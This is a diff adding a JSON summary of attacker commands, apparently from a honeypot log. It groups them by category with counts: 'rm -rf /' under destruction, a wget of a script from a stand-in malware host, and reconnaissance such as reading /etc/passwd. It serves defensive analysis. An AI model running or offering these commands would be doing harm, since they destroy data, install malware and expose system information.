@@ -1,0 +1,25 @@
+{
+    "Destruction": {
+        "count": 9,
+        "description": "Commands intended to wipe data, format drives, or crash the system (Denial of Service).",
+        "commands": {
+            "rm -rf /": 9
+        }
+    },
+    "Malware Download": {
+        "count": 8,
+        "description": "Attempts to fetch malicious binaries or scripts (wget, curl) from external C2 servers.",
+        "commands": {
+            "wget http://malware.com/bot.sh": 8
+        }
+    },
+    "Reconnaissance": {
+        "count": 30,
+        "description": "Attempts to gather system info (CPU, users, network) to find vulnerabilities.",
+        "commands": {
+            "cat /etc/passwd": 11,
+            "uname -a": 10,
+            "whoami": 9
+        }
+    }
+}
